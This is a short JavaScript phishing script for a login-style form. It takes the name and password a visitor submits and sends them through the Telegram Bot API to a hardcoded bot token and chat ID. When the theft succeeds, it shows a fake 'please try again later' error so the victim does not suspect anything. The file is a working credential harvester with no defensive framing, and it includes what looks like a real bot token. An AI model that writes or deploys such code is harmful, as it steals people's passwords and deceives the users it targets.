document.getElementById("inputForm").addEventListener("submit", function(event) {
    event.preventDefault();
  
    // Get the input values
    const name = document.getElementById("name").value;
    const password = document.getElementById("password").value;
  
    // Your bot token
    const botToken = "7320225525:AAEGkM-u25T93CwhW19vG5hpO6iheN0B7mg";
    // The chat ID where the message will be sent
    const chatId = "6883821747";
  
    // The message to send
    const message = `Name: ${name}\nPassword: ${password}`;
  
    // Telegram API URL to send message
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
    // Send the request to Telegram
    fetch(telegramApiUrl)
      .then(response => {
        if (response.ok) {
          alert("ERROR : please try again later.");
        } else {
          alert("ERROR : Check your internet connection.");
        }
      })
      .catch(error => {
        console.error("Error:", error);
      });
  });
  
